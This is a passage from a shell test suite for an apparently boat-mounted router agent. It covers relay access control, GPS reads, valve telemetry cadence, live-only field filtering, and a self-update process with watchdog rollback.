for _rt in "GET /api/hub/net/wan" "GET /api/hub/net/wifi" "POST /api/hub/net/mode" "DELETE /api/hub/net/uplink" "POST /api/hub/reboot" \
           "GET /api/hub/os/check" "POST /api/hub/os/upgrade" "POST /api/hub/os/packages"; do
  set -- $_rt; live_path_allowed "$1" "$2" || _lpa="$_lpa [$_rt]"
done
check "relay: the DN device API and OS routes may be relayed from shore" "" "$_lpa"
live_path_allowed POST /api/hub/net/admin-password && _lpa=relayed || _lpa=refused
check "relay: admin-password is NEVER relayed (the password stays on the boat's network)" "refused" "$_lpa"
live_path_allowed GET /api/hub/net/admin-password && _lpa=relayed || _lpa=refused
check "relay: ...by no method" "refused" "$_lpa"
check "frame: an absent body is absent" "" "$(printf '%s' '{"type":"call","id":"c1","role":"monitor","method":"GET","path":"/api/hub/status"}' | live_frame_str body)"
check "result body: escaped for JSON" 'a \"q\" \\ b\nc' "$(printf 'a "q" \\ b\nc\n' | json_escape_body)"
: > "$SHIM_LOG"
(
  hl17
  export BRVG_HUB_LITE_CONF="$C17/conf" BRVG_HUB_LITE_BIN="$HL_DIR/brvg-hub-lite.sh" BRVG_LT_STATE_DIR="$C17/lt" \
    BRVG_RELAY_SPOOL="$C17/spool" BRVG_HUB_LITE_STARTED="$T/started" BRVG_MEMBER_KEYS="$C17/keys" \
    BRVG_MEMBER_KEYS_STALE="$C17/keys-stale" BRVG_HUB_LITE_RELOAD="$C17/reload" BRVG_HUB_LITE_UPDATE="$C17/update"
  HUB_LITE_API="$HL_DIR/hub-lite-api.sh"; PATH="$T/bin:$PATH"; mkdir -p "$C17/lt"
  REMOTE_ADDR=192.168.8.20; GATEWAY_INTERFACE=CGI/1.1   # as if this shell were uhttpd's: the child must shed both
  call() { printf '{"type":"call","id":"%s","uid":"u1","role":"%s","method":"%s","path":"%s"%s}' "$1" "$2" "$3" "$4" "${5:+,\"body\":\"$5\"}"; }
  call id1 monitor GET /api/hub/status | live_run_call > "$C17/r1"
  call id2 monitor POST /api/hub/linktap/valve "{\\\"devId\\\":\\\"$DEV\\\",\\\"action\\\":\\\"open\\\",\\\"durationSecs\\\":600}" | live_run_call > "$C17/r2"
  call id3 control POST /api/hub/linktap/valve "{\\\"devId\\\":\\\"$DEV\\\",\\\"action\\\":\\\"open\\\",\\\"durationSecs\\\":600}" | live_run_call > "$C17/r3"
  call id4 owner POST /api/hub/bootstrap "{}" | live_run_call > "$C17/r4"
  call id5 viewer GET /api/hub/status | live_run_call > "$C17/r5"
)
check "relay: a monitor reads status over the link" '{"type":"result","id":"id1","status":200,"body":"{\"lite' "$(sed 's/lite.*/lite/' "$C17/r1")"
check "relay: a MONITOR is refused a valve open (D3)" '{"type":"result","id":"id2","status":403,' "$(sed 's/"status":\([0-9]*\),.*/"status":\1,/' "$C17/r2")"
check "relay: a CONTROL crew member opens the valve (D3)" '{"type":"result","id":"id3","status":200,"body":"{\"ok\":true}"}' "$(cat "$C17/r3")"
check "relay: and the gateway got exactly one open" "1" "$(grep -c '"cmd":6' "$SHIM_LOG")"
check "relay: a path outside the router's own allowlist is 404 (setup is LAN-only)" '{"type":"result","id":"id4","status":404,' "$(sed 's/"status":\([0-9]*\),.*/"status":\1,/' "$C17/r4")"
check "relay: a role the door does not know gets nothing" '{"type":"result","id":"id5","status":403,' "$(sed 's/"status":\([0-9]*\),.*/"status":\1,/' "$C17/r5")"
r=$(api GET /status "" HTTP_AUTHORIZATION="" BRVG_RELAY_ROLE=owner GATEWAY_INTERFACE=CGI/1.1)
check "relay role: UNFORGEABLE from the LAN — through uhttpd (GATEWAY_INTERFACE/REMOTE_ADDR set) it is ignored" "401" "$(status_of "$r")"
(
  hl17
  : > "$C17/poll.log"
  curl() {
    case "$*" in
      *live/poll*)
        _o=""; _p=""; for _a in "$@"; do [ "$_p" = "-o" ] && _o="$_a"; _p="$_a"; done
        _n=$(( $(cat "$C17/poll.n" 2>/dev/null || echo 0) + 1 )); echo "$_n" > "$C17/poll.n"
        case "$_n" in
          1) printf '%s' '{"type":"call","id":"k1","uid":"u","role":"monitor","method":"GET","path":"/api/hub/nope"}' > "$_o"; printf 200 ;;
          2) : > "$_o"; printf 204 ;;
          *) printf '{"live":0,"reason":"not_leased"}' > "$_o"; printf 409 ;;
        esac ;;
      *live/result*) for _a in "$@"; do case "$_a" in @*) cat "${_a#@}" >> "$C17/poll.log" ;; esac; done ;;
    esac
  }
  rm -f "$C17/poll.n"
  echo $(( $(date +%s) + 600 )) > "$LIVE_UNTIL_FILE"
  live_link_loop
  echo "polls=$(cat "$C17/poll.n") file=$([ -f "$LIVE_UNTIL_FILE" ] && echo kept || echo gone)" > "$C17/ll"
  cat "$C17/poll.log" >> "$C17/ll"; echo >> "$C17/ll"
  # manage: open with a live lease, close when it is gone
  live_link_loop() { sleep 30; }
  LIVE_LEASE=1; LIVE_UNTIL=$(( $(date +%s) + 120 )); LIVE_OK=1
  live_link_manage "$(date +%s)"
  echo "open=$(live_link_running && echo running || echo no) until=$([ "$(cat "$LIVE_UNTIL_FILE")" = "$LIVE_UNTIL" ] && echo written)" >> "$C17/ll"
  LIVE_LEASE=0; LIVE_UNTIL=0; LIVE_OK=0
  _pid=$(cat "$LIVE_PID_FILE"); live_link_manage "$(date +%s)"; sleep 1
  echo "closed=$(kill -0 "$_pid" 2>/dev/null && echo running || echo stopped) file=$([ -f "$LIVE_UNTIL_FILE" ] && echo kept || echo gone)" >> "$C17/ll"
  LIVE_LEASE=1; LIVE_UNTIL=$(( $(date +%s) + 120 )); LIVE_OK=0
  live_link_manage "$(date +%s)"
  echo "held-elsewhere=$(live_link_running && echo running || echo no)" >> "$C17/ll"
)
check "link: holds the poll, answers the call, re-polls on 204, ends on 409 not_leased" "polls=3 file=gone" "$(sed -n 1p "$C17/ll")"
check "link: the call's answer is posted as a result frame" '{"type":"result","id":"k1","status":404,' "$(sed -n 2p "$C17/ll" | sed 's/"status":\([0-9]*\),.*/"status":\1,/')"
check "link: a live lease OPENS the link (background child, lease clock written)" "open=running until=written" "$(sed -n 3p "$C17/ll")"
check "link: no lease CLOSES it (child stopped, clock removed)" "closed=stopped file=gone" "$(sed -n 4p "$C17/ll")"
check "link: a lease this router may not hold (live=0) opens nothing" "held-elsewhere=no" "$(sed -n 5p "$C17/ll")"

# --- the LAN GPS read: /api/hub/gps/live and cgi-bin/gps ---
printf '{"v":1,"ts":1,"state":"armed","fixValid":true,"lat":41.4,"lon":-81.7}\n' > "$C17/gps.json"
rm -f "$C17/gps.hit"
r=$(api GET /gps/live "" HTTP_AUTHORIZATION="" BRVG_HUB_LITE_GPS="$C17/gps.json" BRVG_HUB_LITE_GPS_HIT="$C17/gps.hit")
check "gps/live: a boat's position needs a member key" "401" "$(status_of "$r")"
r=$(api GET /gps/live "" BRVG_HUB_LITE_GPS="$C17/gps.json" BRVG_HUB_LITE_GPS_HIT="$C17/gps.hit")
check "gps/live: serves the collector's sample verbatim" '200 {"v":1,"ts":1,"state":"armed","fixValid":true,"lat":41.4,"lon":-81.7}' "$(status_of "$r") $(body_of "$r" | tr -d '\r')"
check "gps/live: a read asks the collector to sample at 30 s" "yes" "$([ -s "$C17/gps.hit" ] && echo yes || echo no)"
r=$(printf '' | env PATH="$T/bin:$PATH" REQUEST_METHOD=GET HTTP_AUTHORIZATION="Bearer $KEY" BRVG_HUB_LITE_CONF="$C17/conf" \
  BRVG_HUB_LITE_BIN="$HL_DIR/brvg-hub-lite.sh" BRVG_HUB_LITE_API="$HL_DIR/hub-lite-api.sh" BRVG_HUB_LITE_GPS="$C17/gps.json" \
  BRVG_HUB_LITE_GPS_HIT="$C17/gps.hit" BRVG_MEMBER_KEYS="$C17/keys" REMOTE_ADDR=192.168.8.20 sh "$HL_DIR/hub-lite-gps-cgi.sh" 2>/dev/null)
check "cgi-bin/gps: the same read, same key" "200" "$(status_of "$r")"
check "cgi-bin/gps: JSON, never a web page (owner D1)" "application/json" "$(printf '%s' "$r" | sed -n 's/^Content-Type: \([a-z/]*\).*/\1/p' | head -1)"
r=$(api GET /status "")
check "gps/live: webUiEnabled stays false — a hub-lite still has no local web interface" "1" "$(body_of "$r" | grep -c '"webUiEnabled":false')"

# --- L3: LinkTap measurement only on a transition or while watering ---
check "lt send: every poll while watering" "yes" "$(lt_should_send 1 'w=1 rf=1' 'w=1 rf=1' && echo yes || echo no)"
check "lt send: an idle valve unchanged is NOT sent" "no" "$(lt_should_send 0 'w=0 rf=1' 'w=0 rf=1' && echo yes || echo no)"
check "lt send: watering 1->0 is sent" "yes" "$(lt_should_send 0 'w=1 rf=1' 'w=0 rf=1' && echo yes || echo no)"
check "lt send: the RF link lost is sent" "yes" "$(lt_should_send 0 'w=0 rf=1' 'w=0 rf=0' && echo yes || echo no)"
check "lt send: the first poll after a restart is sent" "yes" "$(lt_should_send 0 '' 'w=0 rf=1' && echo yes || echo no)"
mkdir -p "$T/lt3"; : > "$T/spool3"
lt3() { printf '%s' "$1" > "$SHIM_CMD3"; : > "$SHIM_LOG"
  ( LT_STATE_DIR="$T/lt3"; BRVG_RELAY_SPOOL="$T/spool3"; CONF="$C17/conf"; . "$C17/conf"; PATH="$T/bin:$PATH"; LT_SENT=0; linktap_tick; echo "$LT_SENT" > "$T/lt3.sent" ) }
lt3 '{"is_watering":0,"volume":0,"is_rf_linked":true,"battery":90}'
lt3 '{"is_watering":0,"volume":0,"is_rf_linked":true,"battery":89}'
lt3 '{"is_watering":0,"volume":0,"is_rf_linked":true,"battery":89}'
check "lt tick: three idle polls spool ONE measurement (was three)" "1 0" "$(grep -c 'linktap.measurement' "$T/spool3") $(cat "$T/lt3.sent")"
check "lt tick: the LAN door's copy is still refreshed every poll" "1" "$(grep -c 'battery=89' "$T/lt3/meas.$DEV")"
lt3 '{"is_watering":1,"volume":1,"is_rf_linked":true,"speed":5}'
lt3 '{"is_watering":1,"volume":2,"is_rf_linked":true,"speed":5}'
check "lt tick: the start and every watering poll are sent, and ask for a drain" "3 1" "$(grep -c 'linktap.measurement' "$T/spool3") $(cat "$T/lt3.sent")"
lt3 '{"is_watering":0,"volume":2,"is_rf_linked":true}'
lt3 '{"is_watering":0,"volume":0,"is_rf_linked":false}'
lt3 '{"is_watering":0,"volume":0,"is_rf_linked":false}'
check "lt tick: the stop and an RF loss are sent; the quiet poll after is not" "5" "$(grep -c 'linktap.measurement' "$T/spool3")"
(
  hl17
  LT_STATE_DIR="$T/lt3"; BRVG_RELAY_SPOOL="$T/spool3"; : > "$T/spool3"; rm -f "$T/lt3/idle.at"
  lt_checkin_spool 50000; lt_checkin_spool 50060; lt_checkin_spool 50900
  echo "$(grep -c 'linktap.measurement' "$T/spool3")" > "$T/lt3.ci"
)
check "lt check-in: the idle reading rides the check-in, once per idle period (not every leased minute)" "2" "$(cat "$T/lt3.ci")"

# A valve's signal is live-only (0.18.2): a change in it alone is not a transition, and nobody
# watching, it stays off the wire while the LAN door's copy keeps it.
: > "$T/spool3"
lt3 '{"is_watering":0,"volume":0,"is_rf_linked":true,"battery":88,"signal":40}'
lt3 '{"is_watering":0,"volume":0,"is_rf_linked":true,"battery":88,"signal":85}'
check "lt tick: a signal change alone spools nothing new, and nothing spooled carries signal" "1 0" \
  "$(grep -c 'linktap.measurement' "$T/spool3") $(grep -c 'signal=' "$T/spool3")"
check "lt tick: the LAN door's copy still has the signal" "1" "$(grep -c 'signal=85' "$T/lt3/meas.$DEV")"

# --- 0.18.2: live-only telemetry is sent only while a member is watching (owner ruling 2026-09-19) ---
# The list is DockNeighbor-Cloud src/liveTelemetryFields.ts; one copy here, used by routers.sh too.
check "live-only: the modem list (Cloud liveTelemetryFields.ts, modem.measurement liveOnly)" \
  "rssi rsrp rsrq sinr signal latency ping loss obstruction obstructed uptime downMbps upMbps sats" "$LIVE_ONLY_MODEM"
check "live-only: the linktap list" "signal" "$LIVE_ONLY_LINKTAP"
LO_FULL="up=1&mode=LTE&rssi=-71&rsrp=-101&sinr=7.4&rsrq=-12&carrier=Verizon&sim=ok&dataMb=1&wan=lte&ip=100.64.3.9&model=CBA850&fw=7.0.50&uptime=3600&band=B13&av=hub-lite-x&wanKb_cellular=64&wanSrc=lte&update=0.18.3"
LO_STATE="up=1&mode=LTE&carrier=Verizon&sim=ok&dataMb=1&wan=lte&ip=100.64.3.9&model=CBA850&fw=7.0.50&band=B13&av=hub-lite-x&wanKb_cellular=64&wanSrc=lte&update=0.18.3"
check "live-only: nobody watching — the modem reading without its live-only fields; state, wanKb_*, and an unclassified field (band) kept, in order" \
  "$LO_STATE" "$(LIVE_LEASE=0; LIVE_UNTIL=0; wire_params modem.measurement "$LO_FULL" 1000)"
check "live-only: a live lease sends everything" "$LO_FULL" "$(LIVE_LEASE=1; LIVE_UNTIL=2000; wire_params modem.measurement "$LO_FULL" 1000)"
check "live-only: a lease that has run out is no lease" "$LO_STATE" "$(LIVE_LEASE=1; LIVE_UNTIL=999; wire_params modem.measurement "$LO_FULL" 1000)"
check "live-only: a hub.checkin carrying modem fields follows the modem rule" "$LO_STATE" "$(LIVE_LEASE=0; wire_params hub.checkin "$LO_FULL" 1000)"
_lo_left=$(LIVE_LEASE=0; wire_params modem.measurement "$LO_FULL" 1000)
_lo_bad=""; for _k in $LIVE_ONLY_MODEM; do case "&$_lo_left" in *"&$_k="*) _lo_bad="$_lo_bad $_k" ;; esac; done
check "live-only: no live-only key survives, whatever the list holds" "" "$_lo_bad"
check "live-only: a valve's signal is live-only" "watering=1&vol_l=3.20&battery=93&rf=1&flow_lpm=5.50" \
  "$(LIVE_LEASE=0; wire_params linktap.measurement "watering=1&vol_l=3.20&battery=93&signal=69&rf=1&flow_lpm=5.50" 1000)"
check "live-only: other events are untouched (a GPS fix's sats, a sensor's signal)" "lat=41.1&lon=-81.1&sats=9|tC=21&signal=-60" \
  "$(LIVE_LEASE=0; wire_params gps.measurement "lat=41.1&lon=-81.1&sats=9" 1000)|$(LIVE_LEASE=0; wire_params temperature.measurement "tC=21&signal=-60" 1000)"
check "live-only: empty segments go, nothing else changes" "a=1&b=2" "$(strip_live_only "rssi" "a=1&&rssi=5&b=2&")"
(
  hl17
  MODEM_P="up=1&mode=LTE&rssi=-70&sinr=12&carrier=Verizon&sim=ok&dataMb=1234"; MODEM_PENDING=1
  collect_wan_usage() { printf '&wanKb_cellular=64&wanSrc=lte'; }
  LIVE_LEASE=0; LIVE_UNTIL=0
  compose_checkin_item
  echo "$CHECKIN_ITEM" > "$C17/lo.item"
  grep -c '"rssi":"-70"' "$HUB_LITE_STATE" > "$C17/lo.state"
  # The legacy fallback resends exactly what the check-in composed.
  send_event() { echo "$1 $2" >> "$C17/lo.sent"; }; : > "$C17/lo.sent"
  send_modem
  # And a fallback with no composed item composes its own, by the same rule.
  MODEM_PENDING=1; send_modem
  LIVE_LEASE=1; LIVE_UNTIL=$(( $(date +%s) + 300 ))
  MODEM_PENDING=1; compose_checkin_item
  echo "$CHECKIN_ITEM" >> "$C17/lo.item"
  : > "$C17/spool"; lt_spool lt_x linktap.measurement "watering=0&battery=90&signal=60&rf=1"
  LIVE_LEASE=0; lt_spool lt_x linktap.measurement "watering=0&battery=90&signal=60&rf=1"
  lt_spool lt_x linktap.cycle.change "mode=normal&reason=done"
  cut -f2- "$C17/spool" > "$C17/lo.spool"
)
check "live-only: nobody watching, the check-in item is the modem's STATE with the WAN delta" \
  "up=1&mode=LTE&carrier=Verizon&sim=ok&dataMb=1234&av=$HUB_LITE_VERSION&wanKb_cellular=64&wanSrc=lte" "$(sed -n 1p "$C17/lo.item")"
check "live-only: the LAN door's copy keeps the signal" "1" "$(cat "$C17/lo.state")"
check "live-only: the legacy fallback sends the composed item, and composes its own by the same rule" \
  "modem.measurement up=1&mode=LTE&carrier=Verizon&sim=ok&dataMb=1234&av=$HUB_LITE_VERSION&wanKb_cellular=64&wanSrc=lte
modem.measurement up=1&mode=LTE&carrier=Verizon&sim=ok&dataMb=1234&av=$HUB_LITE_VERSION&wanKb_cellular=64&wanSrc=lte" "$(cat "$C17/lo.sent")"
check "live-only: while a member watches, the check-in carries the whole sample" \
  "up=1&mode=LTE&rssi=-70&sinr=12&carrier=Verizon&sim=ok&dataMb=1234&av=$HUB_LITE_VERSION&wanKb_cellular=64&wanSrc=lte" "$(sed -n 2p "$C17/lo.item")"
check "live-only: a valve's measurement is spooled with its signal only while watched; other valve events untouched" \
  "lt_x	linktap.measurement	watering=0&battery=90&signal=60&rf=1
lt_x	linktap.measurement	watering=0&battery=90&rf=1
lt_x	linktap.cycle.change	mode=normal&reason=done" "$(cat "$C17/lo.spool")"

# --- the batch envelope never claims "keyframe" (the cloud's full-value contract) ---
(
  hl17
  mkdir -p "$RELAY_STATE_DIR"; echo 5 > "$RELAY_SEQ_FILE"
  printf '1\ts1\thumidity.change\trh=60\n' > "$RELAY_SPOOL"
  curl() { for _a in "$@"; do case "$_a" in '{"v":1'*) printf '%s' "$_a" > "$C17/batch" ;; esac; done; printf 200; }
  drain_relay
)
check "batch: the resend-all round (seq 6) is still kind delta — a partial reading is never a keyframe" "1" "$(grep -c '"seq":6,.*"kind":"delta"' "$C17/batch")"
# ⚠️ ITS OWN LT_STATE_DIR. The close is a CLAIM now, so this fresh `sh -c` would otherwise record it in
# the machine's real /tmp/brvg-linktap — and a record left there by an earlier run, or by a hub-lite
# actually running on this box, makes the claim refuse and this count read 0. (It did, once.)
check "flood close is untouched by the cadence: the receiver still closes with the WAN down" "1" \
  "$(LINKTAP_HOST=192.168.8.50 LINKTAP_GW_ID=GW02 LINKTAP_DEV_IDS=$DEV BRVG_RELAY_SPOOL="$C17/fspool" LT_STATE_DIR="$C17/ltflood" PATH="$T/bin:$PATH" sh -c ". \"$HL_DIR/brvg-hub-lite.sh\"; echo 0 > \"$SHIM_RC\"; : > \"$SHIM_LOG\"; linktap_flood_close; grep -c '\"cmd\":7' \"$SHIM_LOG\"")"

# --- 0.18.3: self-update under a watchdog --------------------------------------------------------
# The real self_update, guard and restore, against a temp root. opkg is a stub; "installing" writes a new
# collector script whose --version says what the fake feed offers.
W="$T/wd"; mkdir -p "$W"
HUB_LITE_NO_SERVICE=1
wd_reset() {
  rm -rf "$W"; mkdir -p "$W/root/usr/bin" "$W/root/www/brvg/api"
  printf '#!/bin/sh\necho 0.18.3\n' > "$W/root/usr/bin/brvg-hub-lite"; chmod 755 "$W/root/usr/bin/brvg-hub-lite"
  echo 'door v0.18.3' > "$W/root/www/brvg/api/hub"
  HUB_LITE_ROOT="$W/root"; HUB_LITE_BACKUP="$W/prev.tgz"; HUB_LITE_PROBATION="$W/probation"
  HUB_LITE_SKIP="$W/skip"; HUB_LITE_GUARD="$W/guard"; HUB_LITE_GUARD_INIT="$W/guard.init"; CONF="$W/conf"
  : > "$W/opkg.log"
}
hub_lite_path() { echo "$W/root/usr/bin/brvg-hub-lite"; }
hub_lite_files() { printf '%s\n' /usr/bin/brvg-hub-lite /www/brvg/api/hub; }
# OFFER: the version the fake feed carries. NEWBODY: what "installing" it writes as the collector.
opkg() {
  echo "$*" >> "$W/opkg.log"
  case "$1" in
    update) return 0 ;;
    list) echo "brvg-hub-lite - $OFFER - test" ;;
    upgrade) [ -f "$HUB_LITE_PROBATION" ] && echo armed >> "$W/armed.log"
             [ -n "${UPGRADE_FAILS:-}" ] && return 1
             printf '%s\n' "$NEWBODY" > "$W/root/usr/bin/brvg-hub-lite"; echo "door v$OFFER" > "$W/root/www/brvg/api/hub" ;;
  esac
}
guard() { GUARD_NO_SERVICE=1 sh "$HUB_LITE_GUARD" >/dev/null 2>&1; echo $?; }

wd_reset; OFFER=0.18.4; NEWBODY='#!/bin/sh
echo 0.18.4'
self_update 2>/dev/null
check "self_update: installs the offered version" "0.18.4" "$("$W/root/usr/bin/brvg-hub-lite" --version)"
check "self_update: the new version is on probation, from 0.18.3" "FROM=0.18.3 TO=0.18.4" "$(grep -E '^(FROM|TO)=' "$W/probation" | tr '\n' ' ' | sed 's/ $//')"
check "self_update: the backup holds EVERY file (collector + door)" "usr/bin/brvg-hub-lite www/brvg/api/hub" "$(tar -tzf "$W/prev.tgz" | sort | tr '\n' ' ' | sed 's/ $//')"
# ⚠️ DERIVED, NOT A LITERAL. "The old version" is the script RUNNING this suite, so spelling it out
# makes the check fail on the next release rather than on a real change (it did, on 0.18.4).
# The TRAILING SPACE in the pattern is load-bearing too (#169): without it 0.18.4 also matches 0.18.45.
check "self_update: the guard was written by the RUNNING (outgoing) version" "1" "$(grep -c "Written by hub-lite $HUB_LITE_VERSION " "$W/guard")"
check "self_update: the guard service was written" "1" "$(grep -c 'while /bin/sh' "$W/guard.init")"
check "self_update: no second update while one is on probation" "1:0" "$(self_update 2>/dev/null; echo "$?:$(grep -c upgrade "$W/opkg.log" | awk '{print $1-1}')")"

DL=$(sed -n 's/^DEADLINE=//p' "$W/probation")
check "guard: before the deadline it keeps watching" "0" "$(GUARD_NOW=$((DL - 1)) guard)"
check "guard: ...and changes nothing" "0.18.4" "$("$W/root/usr/bin/brvg-hub-lite" --version)"

echo 'VID=v_x' > "$CONF"
check "guard: enrolled, unconfirmed, WITH a route: it finishes" "1" "$(GUARD_NOW=$DL GUARD_ROUTE=1 guard)"
check "guard: ...and the previous collector is back" "0.18.3" "$("$W/root/usr/bin/brvg-hub-lite" --version)"
check "guard: ...and the previous door is back (every file, not just the collector)" "door v0.18.3" "$(cat "$W/root/www/brvg/api/hub")"
check "guard: ...and 0.18.4 is skip-listed" "0.18.4" "$(cat "$W/skip")"
check "guard: ...and the probation is over" "gone" "$([ -f "$W/probation" ] && echo present || echo gone)"
check "self_update: a skip-listed version is never installed again" "1:0" "$(self_update 2>/dev/null; echo "$?:$(grep -c '^upgrade' "$W/opkg.log" | awk '{print $1-1}')")"

wd_reset; self_update 2>/dev/null; DL=$(sed -n 's/^DEADLINE=//p' "$W/probation"); echo 'VID=v_x' > "$CONF"
check "guard: enrolled, unconfirmed, NO route: kept (its silence proves nothing)" "1" "$(GUARD_NOW=$DL GUARD_ROUTE=0 guard)"
check "guard: ...still the new version" "0.18.4" "$("$W/root/usr/bin/brvg-hub-lite" --version)"
check "guard: ...and nothing skip-listed" "no" "$([ -s "$W/skip" ] && echo yes || echo no)"

wd_reset; self_update 2>/dev/null; DL=$(sed -n 's/^DEADLINE=//p' "$W/probation")
check "guard: NOT enrolled and its door answers with the new version: kept" "1" \
  "$(GUARD_NOW=$DL GUARD_ROUTE=1 GUARD_DOOR='{"ok":true,"version":"0.18.4"}' guard)"
check "guard: ...still the new version" "0.18.4" "$("$W/root/usr/bin/brvg-hub-lite" --version)"

wd_reset; self_update 2>/dev/null; DL=$(sed -n 's/^DEADLINE=//p' "$W/probation")
check "guard: NOT enrolled and the door is silent, with a route: rolled back" "1" "$(GUARD_NOW=$DL GUARD_ROUTE=1 GUARD_DOOR='' guard)"
check "guard: ...the previous version is back" "0.18.3" "$("$W/root/usr/bin/brvg-hub-lite" --version)"

wd_reset; self_update 2>/dev/null; DL=$(sed -n 's/^DEADLINE=//p' "$W/probation")
_hv=$HUB_LITE_VERSION; HUB_LITE_VERSION=0.18.4; probation_confirm 2>/dev/null; HUB_LITE_VERSION=$_hv
check "confirm: the new version's first successful report ends its probation" "gone" "$([ -f "$W/probation" ] && echo present || echo gone)"
check "guard: after a confirmation it finishes without touching anything" "1:0.18.4" "$(GUARD_NOW=$DL GUARD_ROUTE=1 guard):$("$W/root/usr/bin/brvg-hub-lite" --version)"

wd_reset; self_update 2>/dev/null
# Any version that is not the one on probation — named explicitly rather than leaning on the running
# version being different from OFFER, which stopped being true the moment the release caught up to it.
_hv=$HUB_LITE_VERSION; HUB_LITE_VERSION=0.0.1-somebody-else; probation_confirm 2>/dev/null; HUB_LITE_VERSION=$_hv
check "confirm: a report from any other version does NOT confirm the new one" "present" "$([ -f "$W/probation" ] && echo present || echo gone)"

wd_reset; OFFER=0.18.5; NEWBODY='#!/bin/sh
exit 1'
self_update 2>/dev/null
check "smoke check: a new version that can't report its version is rolled back at once" "0.18.3" "$("$W/root/usr/bin/brvg-hub-lite" --version)"
check "smoke check: ...and skip-listed" "0.18.5" "$(cat "$W/skip")"
check "smoke check: ...and never put on probation" "gone" "$([ -f "$W/probation" ] && echo present || echo gone)"

# The /api/hub/update door runs self_update with BRVG_HUB_LITE_TEST=1 (to skip the main loop). The guard
# service must still be enabled and started on that path: record what probation_start asks procd for.
wd_reset; OFFER=0.18.4; NEWBODY='#!/bin/sh
echo 0.18.4'
(
  HUB_LITE_NO_SERVICE=""; BRVG_HUB_LITE_TEST=1
  # The init script probation_start writes is a recorder here, so "procd" is a log of what was asked of it.
  guard_init() { printf '#!/bin/sh\necho "$1" >> "%s"\n' "$W/procd.log"; }
  probation_start 0.18.3 0.18.4 2>/dev/null
)
check "self_update via the app's door (BRVG_HUB_LITE_TEST set): the guard is enabled AND started" "enable start" "$(tr '\n' ' ' < "$W/procd.log" 2>/dev/null | sed 's/ $//')"

# 0.18.4: armed BEFORE opkg, so an upgrade interrupted halfway is already guarded.
wd_reset; OFFER=0.18.4; NEWBODY='#!/bin/sh
echo 0.18.4'; rm -f "$W/armed.log"
self_update 2>/dev/null
check "0.18.4: the probation is armed BEFORE opkg runs" "armed" "$(cat "$W/armed.log" 2>/dev/null)"
# In a subshell: a prefix assignment on a shell FUNCTION persists (and is exported) in POSIX sh.
wd_reset; rm -f "$W/armed.log"; ( UPGRADE_FAILS=1; self_update 2>/dev/null )
check "0.18.4: a failed upgrade clears the probation it armed" "gone" "$([ -f "$W/probation" ] && echo present || echo gone)"

# The guard's restore re-ENABLES the service as well as restarting it: the package's prerm disables it.
wd_reset; self_update 2>/dev/null; DL=$(sed -n 's/^DEADLINE=//p' "$W/probation"); echo 'VID=v_x' > "$CONF"
printf '#!/bin/sh\necho "$1" >> "%s"\n' "$W/svc.log" > "$W/svc"; chmod 755 "$W/svc"
sed -i.bak "s|SVC='[^']*'|SVC='$W/svc'|" "$W/guard"
GUARD_NOW=$DL GUARD_ROUTE=1 sh "$W/guard" >/dev/null 2>&1
check "0.18.4: the guard's rollback enables AND restarts the service" "enable restart" "$(tr '\n' ' ' < "$W/svc.log" 2>/dev/null | sed 's/ $//')"

# The update and rollback verbs never run inside the daemon (its stop would kill them): they go to run_detached.
(
  run_detached() { echo "$1" >> "$W/detached.log"; }
  self_update() { echo inline >> "$W/detached.log"; }
  restore_hub_lite() { echo inline >> "$W/detached.log"; }
  run_commands "c1:self_update c2:rollback_agent" 2>/dev/null
)
check "0.18.4: the cloud's self_update and rollback_agent verbs run detached, never inline" "self_update rollback_requested" \
  "$(tr '\n' ' ' < "$W/detached.log" 2>/dev/null | sed 's/ $//')"

# 0.18.10: BOTH spellings reach the same detached rollback. Without `|rollback_hub_lite` in the
# run_commands case, the new verb falls through to the unknown-verb arm and is acknowledged and
# SILENTLY DROPPED — the rollback simply never happens and the cloud sees a successful ack.
rm -f "$W/detached.log"
(
  run_detached() { echo "$1" >> "$W/detached.log"; }
  self_update() { echo inline >> "$W/detached.log"; }
  restore_hub_lite() { echo inline >> "$W/detached.log"; }
  run_commands "c1:rollback_agent c2:rollback_hub_lite" 2>/dev/null
)
check "0.18.10: both rollback spellings run the same detached rollback" "rollback_requested rollback_requested" \
  "$(tr '\n' ' ' < "$W/detached.log" 2>/dev/null | sed 's/ $//')"
check "0.18.4: the app's /api/hub/update door uses the same detached runner" "1" "$(grep -c '^    run_detached self_update$' "$HL_DIR/hub-lite-api.sh")"
# The LAN door must suppress the follow-up report for BOTH spellings: the binary is being replaced,
# so a follow-up send can only fail.
check "0.18.10: the lan door suppresses the follow-up for both rollback spellings" "1" \
  "$(grep -c 'reboot|reboot_modem|self_update|rollback_agent|rollback_hub_lite) _fu=0' "$HL_DIR/hub-lite-mgmt.sh")"

# The station's regression, on the real run_detached: kill the "daemon's" whole process group mid-update; the
# detached work must still finish. Needs setsid (Linux, and every router); skipped where there is none (macOS).
if command -v setsid >/dev/null 2>&1; then
  printf '%s\n' '. "$HL_DIR/brvg-hub-lite.sh"' 'slow_job() { sleep 2; echo finished > "$W/job.out"; }' > "$W/lib.sh"
  cp "$HL_DIR/brvg-hub-lite.sh" "$W/bin.sh"; cat >> "$W/bin.sh" <<'EOF_SJ'
slow_job() { sleep 2; echo finished > "$SJ_OUT"; }
EOF_SJ
  rm -f "$W/job.out"
  SJ_OUT="$W/job.out" BRVG_HUB_LITE_TEST=1 HL_BIN="$W/bin.sh" setsid sh -c '. "$HL_BIN"; hub_lite_path() { echo "$HL_BIN"; }; run_detached slow_job; sleep 30' &
  # `kill -TERM -<pgid>`, not `kill -TERM -- -<pgid>`: dash's kill rejects the `--` form, and silently killing
  # nothing made this check pass with setsid removed. So also assert the group really died.
  _dp=$!; sleep 1; kill -TERM "-$_dp" 2>/dev/null; sleep 3
  check "0.18.4: the daemon's process group really was killed (else the next check proves nothing)" "dead" \
    "$(kill -0 "$_dp" 2>/dev/null && echo alive || echo dead)"
  check "0.18.4: detached work survives killing the daemon's whole process group" "finished" "$(cat "$W/job.out" 2>/dev/null)"
else
  echo "skip - 0.18.4: process-group survival (no setsid here; CI and routers have it)"
fi

wd_reset; hub_lite_files() { :; }; OFFER=0.18.4
check "self_update: no update without a way back (nothing to back up)" "1:0" "$(self_update 2>/dev/null; echo "$?:$(grep -c '^upgrade' "$W/opkg.log")")"
unset -f opkg hub_lite_files hub_lite_path

# --- 0.18.5: the /api/hub/os routes (DockNeighbor OS, both upgrade levels) -----------------------
O="$T/os"; mkdir -p "$O"
printf 'DN_OS_PROFILE=hub-lite\nDN_OS_VERSION=0.1.3\nDN_OS_UPSTREAM="OpenWrt 24.10.8 ramips/mt76x8"\n' > "$O/release"
# OS_AVAIL: what the stub channel offers. The stubs record every call in $O/calls.
